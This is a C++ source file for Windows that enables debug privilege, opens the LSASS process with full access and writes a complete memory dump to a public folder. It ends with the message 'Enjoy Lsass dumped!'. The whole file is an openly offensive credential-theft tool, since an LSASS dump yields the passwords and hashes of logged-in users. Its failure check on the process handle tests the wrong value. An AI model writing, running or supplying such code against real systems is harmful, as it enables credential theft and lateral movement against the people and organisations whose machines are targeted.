#define _CRT_SECURE_NO_WARNINGS // Suppress security warnings

#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <tchar.h>
#include "DebugHelper.h"
#pragma comment (lib, "Dbghelp.lib")


using namespace std;

bool simpleMDWD()
{
	DWORD lsassPID = getPID();
	HANDLE lsassHandle = NULL;
	EnableDebugPrivilege();

	// Open a handle to lsass.dmp - this is where the minidump file will be saved to
	HANDLE outFile = CreateFile(L"C:\\Users\\Public\\simpleMDWD.raw", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (outFile == INVALID_HANDLE_VALUE) {
		std::cerr << "Failed to create file." << std::endl;
		return false;
	}


	// Open handle to lsass.exe process
	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
	if (lsassHandle == INVALID_HANDLE_VALUE) {
		std::cerr << "Failed to open lsass handle." << std::endl;
		return false;
	}

	// Create minidump
	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);

	if (isDumped) {
		cout << "[+] Enjoy Lsass dumped!" << endl;
	}

	return true;
}